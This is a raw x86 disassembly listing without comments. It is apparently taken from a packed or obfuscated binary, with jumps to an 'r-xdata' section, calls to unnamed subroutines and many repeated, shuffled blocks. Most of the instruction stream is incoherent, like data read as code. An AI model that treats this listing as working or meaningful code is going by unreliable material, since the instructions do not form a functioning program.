mov [ fs : 0xffffffff870f5a59 ] eax
lodsd [ esi ]
add [ eax ] al
add [ esi + 0x790cc483 ] bh
iretd
or edi 0x80c481
add [ eax ] al
retn
pop edx
jne r-xdata
mov eax [ fs : 0xffffffffc9812675 ]
push esi
call sub_404244
and edi 0x850fc67f
pop ecx
jno r-xdata
and edi 0x800fae73
pop eax
pop ecx
jns r-xdata
push esp
push eax
call sub_4042ea
xor ecx 0x4ce85251
add [ eax ] al
add [ ecx - 0x7a17a91e ] al
add [ eax ] eax
add [ edi ] cl
sbb [ ecx + 0xf ] 0x81
mov [ 0xf000000 ] al
xor edi 0x5f795958
pop eax
jge r-xdata
jbe 0x133d144
pop edx
jg r-xdata
mov [ fs : 0x15ffe47d ] eax
ja r-xdata
add edi 0xff74830f
add [ eax ] al
jno 0xf9a9c97
jae r-xdata
mov [ fs : 0xffffffff8a0f6d71 ] eax
push ecx
push edx
call sub_40426a
and edx 0x185e856
add [ eax ] al
jo 0xffffffffa2c15185
jl 0xffffffffc1c175c7
push edx
call sub_404206
and esi 0xe981dd73
pushfd
push edi
pushfd
call sub_404281
jo 0xff9b86e
jo 0xffffffff894f9cab
xchg [ edi ] cl
add [ eax ] al
add [ edi ] cl
lea ecx [ edi ]
and [ eax - 0x1 ] 0xffffffff
dec [ edi ]
lea edx [ eax - 0x64 ]
push ebp
pushfd
insd
sub_40429a
pop ecx
pop edx
ja r-xdata
pop eax
pop ecx
jns r-xdata
mov esi 0x790cc483
pop edx
jg r-xdata
mov [ fs : 0x15ffe47d ] eax
jae r-xdata
mov [ fs : 0xffffffff8a0f6d71 ] eax
add eax 0x4c4835a
jae r-xdata
push edx
call sub_404206
and esi 0xe981dd73
pushfd
push edi
pushfd
call sub_404281
jo 0xff9b86e
jo 0xffffffff894f9cab
ja r-xdata
add edi 0xff74830f
jae r-xdata
call 0xffffffff854f9cd1
xor al 0xff
lea ecx [ edi ]
and [ eax - 0x1 ] 0xffffffff
dec [ edi ]
lea edx [ eax - 0x64 ]
push ebp
pushfd
insd
push ecx
push edx
call sub_40426a
and edx 0x185e856
add [ eax ] al
jo 0xffffffffa2c15185
jl 0xffffffffc1c175c7
jge r-xdata
add ecx 0x870f5859
inc edi
add [ eax ] eax
add [ ecx - 0x7ef0a60a ] al
lodsb [ esi ]
push edi
call sub_40429a
jg 0xfffffffff0b39cc1
add edx 0xc381ea77
pop edx
pop eax
jg r-xdata
add [ eax ] al
add [ edi ] cl
pop ecx
pop eax
ja r-xdata
jne r-xdata
and edx 0x83519c54
in al dx
or al 0xe8
iretd
jae r-xdata
mov ebp 0x64f37759
mov eax [ 0xffffffffc9812675 ]
jae r-xdata
jo 0x586637bd
jge r-xdata
add [ eax ] al
add [ edi ] cl
xchg [ edi - 0x30 ] bh
mov esp 0x11b8f0f
add [ eax ] al
sub ecx 0x8199755a
neg [ eax + 0x59 ]
jns r-xdata
xor esi 0xac810f59
jg 0xffffffffff53c7f5
pop ecx
ja r-xdata
jge 0xffffffff9c95df72
add esp 0x4
jno r-xdata
iretd
push esp
pushfd
push ecx
sub esp 0xc
call sub_404267
mov [ fs : 0xffffffff870f5a59 ] eax
lodsd [ esi ]
add [ eax ] al
add [ esi + 0x790cc483 ] bh
or edi 0x80c481
add [ eax ] al
retn
pop edx
jne r-xdata
mov eax [ fs : 0xffffffffc9812675 ]
push esi
call sub_404244
and edi 0x850fc67f
pop ecx
jno r-xdata
and edi 0x800fae73
xchg [ edi ] cl
push esp
push eax
call sub_4042ea
xor ecx 0x4ce85251
add [ eax ] al
add [ ecx - 0x7a17a91e ] al
add [ eax ] eax
add [ edi ] cl
sbb [ ecx + 0xf ] 0x81
mov [ 0xf000000 ] al
xor edi 0x5f795958
pop eax
jge r-xdata
jbe 0x133d144
add [ eax ] al
jno 0xf9a9c97
sub_4042a3
add esp 0xc
jns r-xdata
pop eax
pop ecx
sub eax 0xbb830f
add [ eax ] al
jns 0x119c9c4
jae r-xdata
mov ebp 0x64f37759
mov eax [ 0xffffffffc9812675 ]
add [ eax ] al
sub esi 0xf58595a
sub [ edi - 0x1 ] 0xffffffff
inc [ ecx - 0x70f0a53a ]
add [ eax ] 0x0
add [ ebx + 0x71 ] ah
insd
jpe 0x74cd522d
pop ecx
pop eax
ja r-xdata
jg 0xffffffffff53c7f5
jne r-xdata
and edx 0x83519c54
in al dx
or al 0xe8
iretd
jge r-xdata
jns r-xdata
xor esi 0xac810f59
push edi
call sub_40429a
jg 0xfffffffff0b39cc1
add edx 0xc381ea77
pop edx
pop eax
jg r-xdata
push esp
pushfd
push ecx
sub esp 0xc
call sub_404267
mov [ fs : 0xffffffff870f5a59 ] eax
lodsd [ esi ]
add [ eax ] al
add [ esi + 0x790cc483 ] bh
iretd
or edi 0x80c481
add [ eax ] al
retn
add eax 0x4c4835a
jae r-xdata
jae r-xdata
jo 0x586637bd
jae r-xdata
call 0xffffffff854f9cd1
xor al 0xff
pop ecx
ja r-xdata
jge 0xffffffff9c95df72
add esp 0x4
jno r-xdata
jge r-xdata
add [ eax ] al
add [ edi ] cl
xchg [ edi - 0x30 ] bh
mov esp 0x11b8f0f
add [ eax ] al
sub ecx 0x8199755a
neg [ eax + 0x59 ]
add ecx 0x870f5859
inc edi
add [ eax ] eax
add [ ecx - 0x7ef0a60a ] al
lodsb [ esi ]
pop edx
jne r-xdata
mov eax [ fs : 0xffffffffc9812675 ]
push esi
call sub_404244
and edi 0x850fc67f
pop ecx
jno r-xdata
and edi 0x800fae73
pop eax
pop ecx
jns r-xdata
push esp
push eax
call sub_4042ea
xor ecx 0x4ce85251
add [ eax ] al
add [ ecx - 0x7a17a91e ] al
add [ eax ] eax
add [ edi ] cl
sbb [ ecx + 0xf ] 0x81
mov [ 0xf000000 ] al
xor edi 0x5f795958
pop eax
jge r-xdata
jbe 0x133d144
pop edx
jg r-xdata
mov [ fs : 0x15ffe47d ] eax
ja r-xdata
add edi 0xff74830f
add [ eax ] al
jno 0xf9a9c97
jae r-xdata
mov [ fs : 0xffffffff8a0f6d71 ] eax
push ecx
push edx
call sub_40426a
and edx 0x185e856
add [ eax ] al
jo 0xffffffffa2c15185
jl 0xffffffffc1c175c7
push edx
call sub_404206
and esi 0xe981dd73
pushfd
push edi
pushfd
call sub_404281
jo 0xff9b86e
jo 0xffffffff894f9cab
xchg [ edi ] cl
add [ eax ] al
add [ edi ] cl
lea ecx [ edi ]
and [ eax - 0x1 ] 0xffffffff
dec [ edi ]
lea edx [ eax - 0x64 ]
push ebp
pushfd
insd
sub_4042ea
pop edx
add esp 0x4
jne r-xdata
pushfd
push edi
pushfd
call sub_404281
jo 0xff9b86e
xor edi 0xaae85157
lea ecx [ edi ]
and [ eax - 0x1 ] 0xffffffff
dec [ edi ]
lea edx [ eax - 0x64 ]
push ebp
pushfd
push edi
call sub_40429a
jg 0xfffffffff0b39cc1
add edx 0xc381ea77
pop edx
pop eax
jg r-xdata
add eax 0x4c4835a
jae r-xdata
jae r-xdata
jo 0x586637bd
jae r-xdata
call 0xffffffff854f9cd1
xor al 0xff
pop ecx
ja r-xdata
jge 0xffffffff9c95df72
add esp 0x4
jno r-xdata
jge r-xdata
add ecx 0x870f5859
inc edi
add [ eax ] eax
add [ ecx - 0x7ef0a60a ] al
lodsb [ esi ]
pop edx
jne r-xdata
mov eax [ fs : 0xffffffffc9812675 ]
push esi
call sub_404244
and edi 0x850fc67f
pop ecx
jno r-xdata
and edi 0x800fae73
pop eax
pop ecx
jns r-xdata
jne r-xdata
and edx 0x83519c54
in al dx
or al 0xe8
iretd
jae r-xdata
mov ebp 0x64f37759
mov eax [ 0xffffffffc9812675 ]
push esp
push eax
call sub_4042ea
xor ecx 0x4ce85251
add [ eax ] al
add [ ecx - 0x7a17a91e ] al
add [ eax ] eax
add [ edi ] cl
sbb [ ecx + 0xf ] 0x81
mov [ 0xf000000 ] al
xor edi 0x5f795958
pop eax
jge r-xdata
jbe 0x133d144
pop edx
jg r-xdata
mov [ fs : 0x15ffe47d ] eax
pop ecx
pop eax
ja r-xdata
jg 0xffffffffff53c7f5
ja r-xdata
add edi 0xff74830f
add [ eax ] al
jno 0xf9a9c97
jae r-xdata
mov [ fs : 0xffffffff8a0f6d71 ] eax
jge r-xdata
add [ eax ] al
add [ edi ] cl
xchg [ edi - 0x30 ] bh
mov esp 0x11b8f0f
add [ eax ] al
sub ecx 0x8199755a
neg [ eax + 0x59 ]
jns r-xdata
xor esi 0xac810f59
push ecx
push edx
call sub_40426a
and edx 0x185e856
add [ eax ] al
jo 0xffffffffa2c15185
jl 0xffffffffc1c175c7
push edx
call sub_404206
and esi 0xe981dd73
jo 0xffffffff894f9cab
push esp
pushfd
push ecx
sub esp 0xc
call sub_404267
mov [ fs : 0xffffffff870f5a59 ] eax
lodsd [ esi ]
add [ eax ] al
add [ esi + 0x790cc483 ] bh
iretd
or edi 0x80c481
add [ eax ] al
retn
xchg [ edi ] cl
add [ eax ] al
add [ edi ] cl
insd
sub_404303
jae r-xdata
jne r-xdata
sub ecx 0xe89c579c
jb r-xdata
jne r-xdata
sub edi 0x4c4835a
jne r-xdata
pop edx
pop ecx
pop eax
jae r-xdata
mov ecx 0xf6811c75
pushfd
push edi
pushfd
call sub_404281
jo 0xff9b86e
xor edi 0xaae85157
jg r-xdata
add esi 0x808f0f5a
add [ eax ] al
add [ ebx + 0x71 ] ah
insd
jpe 0x74cd522d
lea ecx [ edi ]
and [ eax - 0x1 ] 0xffffffff
dec [ edi ]
lea edx [ eax - 0x64 ]
jg r-xdata
jno 0xf9a9c97
push edi
call sub_40429a
jg 0xfffffffff0b39cc1
add edx 0xc381ea77
pop edx
pop eax
jg r-xdata
push edi
push ecx
call sub_4042a3
add edx 0xff05e852
jne 0xffffffffc2c170a7
add eax 0x4c4835a
jae r-xdata
jae r-xdata
jo 0x586637bd
ja r-xdata
jae r-xdata
call 0xffffffff854f9cd1
xor al 0xff
pop ecx
ja r-xdata
jge 0xffffffff9c95df72
add esp 0x4
jno r-xdata
push ebp
pushfd
push eax
pushfd
add ebx 0xdc7f585a
jge r-xdata
add ecx 0x870f5859
inc edi
add [ eax ] eax
add [ ecx - 0x7ef0a60a ] al
lodsb [ esi ]
pop edx
jne r-xdata
mov eax [ fs : 0xffffffffc9812675 ]
push esi
call sub_404244
and edi 0x850fc67f
pop ecx
jno r-xdata
and edi 0x800fae73
pop eax
pop ecx
jns r-xdata
jne r-xdata
and edx 0x83519c54
in al dx
or al 0xe8
iretd
jae r-xdata
mov ebp 0x64f37759
mov eax [ 0xffffffffc9812675 ]
push esp
push eax
call sub_4042ea
xor ecx 0x4ce85251
add [ eax ] al
add [ ecx - 0x7a17a91e ] al
add [ eax ] eax
add [ edi ] cl
sbb [ ecx + 0xf ] 0x81
mov [ 0xf000000 ] al
xor edi 0x5f795958
pop eax
jge r-xdata
jbe 0x133d144
pop edx
jg r-xdata
mov [ fs : 0x15ffe47d ] eax
pop ecx
pop eax
ja r-xdata
jg 0xffffffffff53c7f5
ja r-xdata
add edi 0xff74830f
add [ eax ] al
jae r-xdata
mov [ fs : 0xffffffff8a0f6d71 ] eax
jge r-xdata
add [ eax ] al
add [ edi ] cl
xchg [ edi - 0x30 ] bh
mov esp 0x11b8f0f
add [ eax ] al
sub ecx 0x8199755a
neg [ eax + 0x59 ]
jns r-xdata
xor esi 0xac810f59
push ecx
push edx
call sub_40426a
and edx 0x185e856
add [ eax ] al
jo 0xffffffffa2c15185
jl 0xffffffffc1c175c7
push edx
call sub_404206
and esi 0xe981dd73
jo 0xffffffff894f9cab
push esp
pushfd
push ecx
sub esp 0xc
call sub_404267
mov [ fs : 0xffffffff870f5a59 ] eax
lodsd [ esi ]
add [ eax ] al
add [ esi + 0x790cc483 ] bh
iretd
or edi 0x80c481
add [ eax ] al
retn
xchg [ edi ] cl
add [ eax ] al
add [ edi ] cl
insd
sub_4043be
sub esp 0x14
push ebp
push edi
push esp
sub esp 0x8
call sub_404469
jns 0xffffffff9cc1532b
add [ eax ] al
add [ 0xffffffff850f595a ] cl
jns r-xdata
jmp 0x1002c49
pop edx
jno r-xdata
mov esp 0x83ba5c73
les ecx [ eax ]
jae r-xdata
jns r-xdata
xor esi 0x8c0fec75
pop edx
pop ecx
jne r-xdata
xor edx 0x8c0fbf7f
push eax
push ecx
sub esp 0x10
call sub_404465
jo 0xffffffffff29d226
or esi 0xf04c483
xor ebp 0xfffffffe
jae r-xdata
mov eax [ fs : 0x79b95e75 ]
dec ecx
jge r-xdata
js 0x59755157
jae r-xdata
or eax 0x15ff2875
push esi
call sub_4044b4
sub eax 0xc9811c71
xor eax 0x81247359
out dx eax
pop ecx
and ebx 0x1c7d5958
jae r-xdata
ja r-xdata
mov [ fs : 0x73bca279 ] eax
pop esp
pop edx
jns r-xdata
sub edx 0xee815d71
add esp 0x4
jae r-xdata
jmp [ 0xc4830f ]
pop ecx
jg r-xdata
sub ecx 0xce819d75
pop ecx
pop ecx
jg r-xdata
pushfd
push esp
push esi
push esi
sub edi 0xad830f
add [ eax ] al
jne r-xdata
jpe 0x18c35420
jns r-xdata
add ebx 0x9c575756
jae r-xdata
or eax 0x8d0fb671
jne r-xdata
call 0xffffffffcec186ad
jno r-xdata
add ecx 0x8d0f3a7d
jne r-xdata
pop edx
jne r-xdata
ja 0xffffffffe85bc38f
jae r-xdata
jl 0xffffffffa1a4d6c9
pop eax
jae r-xdata
mov edi 0xf35f675
test [ esi - 0x1 ] edx
pop ecx
jae r-xdata
jns r-xdata
mov ecx 0x59054979
call sub_404483
sub ebx 0xa3642773
push esi
push edi
push edi
pushfd
jo 0xffffffffa0c1539d
pop edx
jg r-xdata
or ecx 0xea830f
add [ eax ] al
pop ecx
pop edx
ja r-xdata
ja 0xffffffffc2c1f7f0
jns r-xdata
or esi 0xf4f755a
sbb [ edx + 0xf ] 0x81
mov al [ 0xffffffff81000000 ]
div [ ebp - 0x14 ]
pop ecx
add eax 0xfefc8d0f
add [ eax ] al
add [ ecx + 0xfec75f6 ] al
jne r-xdata
sub eax 0xf04c483
sub eax 0x81000000
into
pop edx
jae r-xdata
xor edi 0x5c775a59
pop ecx
pop edx
ja r-xdata
pop eax
jno r-xdata
jno r-xdata
mov esp 0xd2775a59
jne r-xdata
mov eax [ fs : 0xffffffffec835150 ]
adc al ch
push esp
jns r-xdata
or esi 0x890f537f
jge r-xdata
sub edx 0xf281e771
add [ esp + 0xc ] 0x6
sub esi 0x8a0f8677
jae r-xdata
or esi 0x937f5959
jae r-xdata
add eax 0x81d97959
jmp 0xffffffffcec1e1d4
jg r-xdata
jge 0x18aca3e
jne r-xdata
mov edx 0xf08c483
sub [ edi + edi * 8 ] 0xffffffff
inc [ ecx + 0xfbf7ff2 ]
mov [ ecx + 0x73 ] ds
in al 0xd
jae r-xdata
add edx 0xffa5e89c
add [ eax ] al
jno r-xdata
xor eax 0xff56850f
jge r-xdata
xor esi 0xf04c483
xchg [ ebp - 0x7f000000 ] ebx
0x57e85254 0x0
ja r-xdata
jg r-xdata
jge 0xffffffffc009ba54
pop eax
jae r-xdata
xor edx 0x9c579c55
call sub_4045e2
mov edx 0xfb89c71
xchg [ edi + edi * 8 - 0x1 ] esp
inc [ ecx + 0xf3e7fc3 ]
test [ edi ] cl
mov [ edx - 0x1 ] eax
pop ecx
pop eax
pop eax
or esi 0x8b0f0a73
jg r-xdata
jl 0xe24b80d
add esp 0x4
ja r-xdata
jge 0x100c8dc
jns r-xdata
add esi 0x99870f
add esp 0x4
jno r-xdata
add edx 0x81447158
0xf281e771 0x4079
pop eax
jg r-xdata
jne 0xffffffffe7c23326
add [ eax ] al
jae r-xdata
jbe 0xfffffffff2c20782
jge r-xdata
or esi 0xf0a735a
xchg [ ecx + 0x7f ] ebx
sbb ebp eax
jns r-xdata
xor esi 0x76795a59
jb 0x120c879
ja r-xdata
pop edx
jg r-xdata
or edx 0xf8810f
add [ eax ] al
jae r-xdata
jo 0xc6489a2
pop edx
jno r-xdata
and ecx 0xff69830f
add [ eax ] al
ja r-xdata
mov edi 0xcf81337f
jns r-xdata
add [ eax ] al
add esi 0x7f585859
imul eax [ ecx - 0x6678f03a ] 0x0
jge r-xdata
call sub_404476
sub eax 0xe48f0f5a
add [ eax ] al
add [ ecx + 0x775a59f7 ] al
pop esp
xor ecx 0x5656549c
sub esp 0x1c
jge r-xdata
push es
jae r-xdata
sub edi 0xff5b8d0f
pop eax
jg r-xdata
sub esi 0x73b9397d
mov ebx 0x810f5a5a
pop edx
jae r-xdata
mov [ fs : 0xf08c483 ] eax
and [ ebp - 0x42000000 ] 0xffffff83
les eax [ edi + esi * 2 ]
mov ah 0xf
test [ ecx - 0x13 ] edi
and edi 0x7fbfe177
xor eax [ ecx + 0xf647dcf ]
lea edi [ ecx + 0x17 ]
jg r-xdata
jge 0xffffffffe1c15d35
jae r-xdata
jpo 0x36289d7b
pop ecx
jno r-xdata
xor esi 0xe381807d
pop eax
pop ecx
jge r-xdata
jge r-xdata
add eax 0xe818ec83
cmpsb [ esi ] [ edi ]
ja r-xdata
jmp 0xffffffffe7289dcb
ja r-xdata
sub eax 0x58bc3177
pop edx
add esp 0x4
jae r-xdata
pushfd
call sub_404605
call [ 0xfffffffff281d277 ]
je 0xffffffffff82cf31
jae r-xdata
pop eax
pop eax
jns r-xdata
mov eax 0xca811073
jno r-xdata
add [ eax ] al
add [ ecx - 0x1f8ca535 ] al
test [ eax ] 0x0
add [ edi ] cl
mov [ ebx + 0xd ] dh
or eax 0x850f595a
pop eax
jne r-xdata
mov eax [ fs : 0xffffffffff49890f ]
jge r-xdata
pop edx
jno r-xdata
mov ecx 0x5abb3e73
jae r-xdata
jmp [ 0x182464ff ]
jae r-xdata
add ebx 0x840f3e7f
sub esp 0x18
call sub_404533
add edx 0x79810f59
add eax 0xff0e830f
jne r-xdata
jne 0x101bb920
ja r-xdata
jmp [ 0xfffffffffee78f0f ]
pop ecx
jno r-xdata
sub ecx 0xa6810f5a
add [ eax ] al
add [ ecx + 0x5b8d0fef ] al
xchg edi eax
add [ eax ] al
add [ ecx + 0x585859c6 ] al
mov ebx 0x810f5a5a
jae r-xdata
jpo 0x5a9a9d90
lea ecx [ edi ]
add eax 0x0
pushfd
push eax
call sub_40463e
sub esi 0xe92e7f58
push esp
push edi
call sub_404560
and eax 0xf0d2b73
xor ebp 0xfffffffe
mov esp 0xc4835a58
add al 0x73
dec eax
jno r-xdata
jno 0xffffffffff13cdab
jmp [ esp + 0x18 ]
or eax 0xfef5830f
mov eax 0xff64870f
sub_404465
jge r-xdata
add esp 0x8
jge 0xffffffff874ff6e2
pop edx
pop ecx
jne r-xdata
xor edx 0x8c0fbf7f
jg r-xdata
jge r-xdata
js 0x59755157
jae r-xdata
or eax 0x15ff2875
add esp 0x4
jno r-xdata
add edx 0x81447158
0xf281e771 0x4079
pop ecx
and ebx 0x1c7d5958
jae r-xdata
ja r-xdata
mov [ fs : 0x73bca279 ] eax
pop esp
pop edx
jns r-xdata
sub edx 0xee815d71
jge r-xdata
or esi 0xf0a735a
xchg [ ecx + 0x7f ] ebx
sbb ebp eax
pop ecx
jg r-xdata
sub ecx 0xce819d75
pop ecx
pop ecx
jg r-xdata
pushfd
push esp
push esi
push esi
sub edi 0xad830f
add [ eax ] al
jne r-xdata
jpe 0x18c35420
jns r-xdata
add ebx 0x9c575756
jae r-xdata
jo 0xc6489a2
jns r-xdata
or esi 0xf4f755a
sbb [ edx + 0xf ] 0x81
mov al [ 0xffffffff81000000 ]
div [ ebp - 0x14 ]
jne r-xdata
call 0xffffffffcec186ad
jno r-xdata
add ecx 0x8d0f3a7d
jne r-xdata
pop edx
jne r-xdata
ja 0xffffffffe85bc38f
jae r-xdata
jl 0xffffffffa1a4d6c9
jae r-xdata
mov eax [ fs : 0x79b95e75 ]
dec ecx
pop edx
jno r-xdata
jae r-xdata
mov esp 0x83ba5c73
les ecx [ eax ]
jge r-xdata
call sub_404476
sub eax 0xe48f0f5a
add [ eax ] al
add [ ecx + 0x775a59f7 ] al
pop esp
xor ecx 0x5656549c
push es
jno r-xdata
mov esp 0xd2775a59
pop ecx
jae r-xdata
jns r-xdata
mov ecx 0x59054979
call sub_404483
sub ebx 0xa3642773
push esi
push edi
push edi
pushfd
jo 0xffffffffa0c1539d
pop edx
jg r-xdata
or ecx 0xea830f
add [ eax ] al
pop ecx
pop edx
ja r-xdata
ja 0xffffffffc2c1f7f0
push esi
call sub_4044b4
sub eax 0xc9811c71
xor eax 0x81247359
out dx eax
jns r-xdata
xor esi 0x8c0fec75
pop ecx
jno r-xdata
xor esi 0xe381807d
pop eax
pop ecx
jge r-xdata
jg r-xdata
jge 0x18aca3e
sub esp 0x1c
jge r-xdata
add [ esp + 0xc ] 0x6
sub esi 0x8a0f8677
add [ eax ] al
add [ ecx + 0xfec75f6 ] al
jne r-xdata
sub eax 0xf04c483
sub eax 0x81000000
into
pop edx
jae r-xdata
xor edi 0x5c775a59
pop ecx
pop edx
ja r-xdata
pop eax
jno r-xdata
add esp 0x4
jae r-xdata
jmp [ 0xc4830f ]
jns r-xdata
jmp 0x1002c49
push eax
push ecx
sub esp 0x10
call sub_404465
jo 0xffffffffff29d226
or esi 0xf04c483
xor ebp 0xfffffffe
or eax 0x850f595a
test [ eax ] 0x0
add [ edi ] cl
mov [ ebx + 0xd ] dh
pop eax
jne r-xdata
mov eax [ fs : 0xffffffffff49890f ]
jae r-xdata
add edx 0xffa5e89c
add [ eax ] al
pop ecx
add eax 0xfefc8d0f
jne r-xdata
mov eax [ fs : 0xffffffffec835150 ]
adc al ch
push esp
jns r-xdata
or esi 0x890f537f
jge r-xdata
sub edx 0xf281e771
jae r-xdata
or eax 0x8d0fb671
pop eax
jae r-xdata
mov edi 0xf35f675
test [ esi - 0x1 ] edx
jge r-xdata
xor esi 0xf04c483
xchg [ ebp - 0x7f000000 ] ebx
0x57e85254 0x0
ja r-xdata
jae r-xdata
or esi 0x937f5959
jae r-xdata
add eax 0x81d97959
jmp 0xffffffffcec1e1d4
pop eax
jae r-xdata
xor edx 0x9c579c55
call sub_4045e2
mov edx 0xfb89c71
xchg [ edi + edi * 8 - 0x1 ] esp
inc [ ecx + 0xf3e7fc3 ]
test [ edi ] cl
mov [ edx - 0x1 ] eax
pop ecx
pop eax
pop eax
or esi 0x8b0f0a73
jne r-xdata
mov edx 0xf08c483
sub [ edi + edi * 8 ] 0xffffffff
inc [ ecx + 0xfbf7ff2 ]
mov [ ecx + 0x73 ] ds
in al 0xd
add esp 0x4
ja r-xdata
jge 0x100c8dc
jns r-xdata
add esi 0x99870f
jno r-xdata
xor eax 0xff56850f
pop eax
jg r-xdata
jne 0xffffffffe7c23326
add [ eax ] al
jae r-xdata
jbe 0xfffffffff2c20782
jg r-xdata
jge 0xffffffffc009ba54
jns r-xdata
xor esi 0x76795a59
jb 0x120c879
ja r-xdata
pop edx
jg r-xdata
or edx 0xf8810f
add [ eax ] al
jl 0xe24b80d
pop edx
jno r-xdata
and ecx 0xff69830f
add [ eax ] al
ja r-xdata
mov edi 0xcf81337f
jns r-xdata
add [ eax ] al
add esi 0x7f585859
imul eax [ ecx - 0x6678f03a ] 0x0
jae r-xdata
sub edi 0xff5b8d0f
pop eax
jg r-xdata
sub esi 0x73b9397d
mov ebx 0x810f5a5a
pop edx
jae r-xdata
mov [ fs : 0xf08c483 ] eax
and [ ebp - 0x42000000 ] 0xffffff83
les eax [ edi + esi * 2 ]
mov ah 0xf
test [ ecx - 0x13 ] edi
and edi 0x7fbfe177
xor eax [ ecx + 0xf647dcf ]
lea edi [ ecx + 0x17 ]
jg r-xdata
jge 0xffffffffe1c15d35
jae r-xdata
jpo 0x36289d7b
jge r-xdata
add eax 0xe818ec83
cmpsb [ esi ] [ edi ]
ja r-xdata
jmp 0xffffffffe7289dcb
ja r-xdata
sub eax 0x58bc3177
pop edx
add esp 0x4
jae r-xdata
pushfd
call sub_404605
call [ 0xfffffffff281d277 ]
je 0xffffffffff82cf31
jae r-xdata
pop eax
pop eax
jns r-xdata
mov eax 0xca811073
jno r-xdata
add [ eax ] al
add [ ecx - 0x1f8ca535 ] al
jge r-xdata
pop edx
jno r-xdata
mov ecx 0x5abb3e73
jae r-xdata
jmp [ 0x182464ff ]
jae r-xdata
add ebx 0x840f3e7f
sub esp 0x18
call sub_404533
add edx 0x79810f59
add eax 0xff0e830f
jne r-xdata
jne 0x101bb920
ja r-xdata
jmp [ 0xfffffffffee78f0f ]
pop ecx
jno r-xdata
sub ecx 0xa6810f5a
add [ eax ] al
add [ ecx + 0x5b8d0fef ] al
xchg edi eax
add [ eax ] al
add [ ecx + 0x585859c6 ] al
mov ebx 0x810f5a5a
jae r-xdata
jpo 0x5a9a9d90
lea ecx [ edi ]
add eax 0x0
pushfd
push eax
call sub_40463e
sub esi 0xe92e7f58
push esp
push edi
call sub_404560
and eax 0xf0d2b73
xor ebp 0xfffffffe
mov esp 0xc4835a58
add al 0x73
dec eax
jno r-xdata
jno 0xffffffffff13cdab
jmp [ esp + 0x18 ]
or eax 0xfef5830f
mov eax 0xff64870f
sub_404469
jne r-xdata
pop ecx
pop edx
ja r-xdata
ja 0xffffffffc2c1f7f0
pop ecx
pop edx
ja r-xdata
sub eax 0xf04c483
sub eax 0x81000000
into
pop edx
jae r-xdata
pop eax
jno r-xdata
jns r-xdata
or esi 0x890f537f
pop edx
jne r-xdata
ja 0xffffffffe85bc38f
jge r-xdata
sub edx 0xf281e771
jae r-xdata
add eax 0x81d97959
jmp 0xffffffffcec1e1d4
jns r-xdata
add ebx 0x9c575756
call sub_404483
sub ebx 0xa3642773
push esi
push edi
push edi
pushfd
jo 0xffffffffa0c1539d
jae r-xdata
pop edx
jns r-xdata
sub edx 0xee815d71
jno r-xdata
mov esp 0xd2775a59
jne r-xdata
mov edx 0xf08c483
sub [ edi + edi * 8 ] 0xffffffff
inc [ ecx + 0xfbf7ff2 ]
mov [ ecx + 0x73 ] ds
in al 0xd
jae r-xdata
mov eax [ fs : 0x79b95e75 ]
dec ecx
pop edx
jno r-xdata
mov esp 0x83ba5c73
les ecx [ eax ]
jae r-xdata
add [ eax ] al
add [ ecx + 0xfec75f6 ] al
jns r-xdata
or esi 0xf4f755a
sbb [ edx + 0xf ] 0x81
mov al [ 0xffffffff81000000 ]
div [ ebp - 0x14 ]
jne r-xdata
jpe 0x18c35420
add [ esp + 0xc ] 0x6
sub esi 0x8a0f8677
jno r-xdata
xor eax 0xff56850f
push esi
call sub_4044b4
sub eax 0xc9811c71
xor eax 0x81247359
out dx eax
jns r-xdata
xor esi 0x8c0fec75
pop edx
pop ecx
jne r-xdata
xor edx 0x8c0fbf7f
jne r-xdata
jl 0xffffffffa1a4d6c9
jg r-xdata
jge 0x18aca3e
pop ecx
add eax 0xfefc8d0f
jg r-xdata
jge 0xffffffffc009ba54
add esp 0x4
jae r-xdata
jmp [ 0xc4830f ]
jns r-xdata
jmp 0x1002c49
push eax
push ecx
sub esp 0x10
call sub_404465
jo 0xffffffffff29d226
or esi 0xf04c483
xor ebp 0xfffffffe
jge r-xdata
js 0x59755157
jae r-xdata
or eax 0x15ff2875
pop ecx
jae r-xdata
mov ecx 0x59054979
jae r-xdata
add edx 0xffa5e89c
add [ eax ] al
pushfd
push esp
push esi
push esi
sub edi 0xad830f
add [ eax ] al
jg r-xdata
jl 0xe24b80d
jae r-xdata
or eax 0x8d0fb671
jns r-xdata
pop ecx
and ebx 0x1c7d5958
jae r-xdata
ja r-xdata
mov [ fs : 0x73bca279 ] eax
pop esp
pop ecx
jg r-xdata
sub ecx 0xce819d75
pop ecx
pop ecx
jg r-xdata
jge r-xdata
xor esi 0xf04c483
xchg [ ebp - 0x7f000000 ] ebx
0x57e85254 0x0
ja r-xdata
add esp 0x4
jno r-xdata
add edx 0x81447158
0xf281e771 0x4079
pop eax
jae r-xdata
mov edi 0xf35f675
test [ esi - 0x1 ] edx
call 0xffffffffcec186ad
jno r-xdata
add ecx 0x8d0f3a7d
pop eax
jae r-xdata
xor edx 0x9c579c55
call sub_4045e2
mov edx 0xfb89c71
xchg [ edi + edi * 8 - 0x1 ] esp
inc [ ecx + 0xf3e7fc3 ]
test [ edi ] cl
mov [ edx - 0x1 ] eax
pop ecx
pop eax
pop eax
or esi 0x8b0f0a73
jge r-xdata
or esi 0xf0a735a
xchg [ ecx + 0x7f ] ebx
sbb ebp eax
pop edx
jg r-xdata
or ecx 0xea830f
add [ eax ] al
add esp 0x4
ja r-xdata
jge 0x100c8dc
jns r-xdata
add esi 0x99870f
jae r-xdata
jo 0xc6489a2
jne r-xdata
xor edi 0x5c775a59
pop eax
jg r-xdata
jne 0xffffffffe7c23326
add [ eax ] al
jae r-xdata
jbe 0xfffffffff2c20782
jge r-xdata
call sub_404476
sub eax 0xe48f0f5a
add [ eax ] al
add [ ecx + 0x775a59f7 ] al
pop esp
xor ecx 0x5656549c
sub esp 0x1c
jge r-xdata
push es
jne r-xdata
mov eax [ fs : 0xffffffffec835150 ]
adc al ch
push esp
jns r-xdata
xor esi 0x76795a59
jb 0x120c879
ja r-xdata
pop edx
jg r-xdata
or edx 0xf8810f
add [ eax ] al
pop ecx
jno r-xdata
xor esi 0xe381807d
pop eax
pop ecx
jge r-xdata
jae r-xdata
or esi 0x937f5959
pop edx
jno r-xdata
and ecx 0xff69830f
add [ eax ] al
ja r-xdata
mov edi 0xcf81337f
jns r-xdata
add [ eax ] al
add esi 0x7f585859
imul eax [ ecx - 0x6678f03a ] 0x0
or eax 0x850f595a
test [ eax ] 0x0
add [ edi ] cl
mov [ ebx + 0xd ] dh
pop eax
jne r-xdata
mov eax [ fs : 0xffffffffff49890f ]
jae r-xdata
sub edi 0xff5b8d0f
pop eax
jg r-xdata
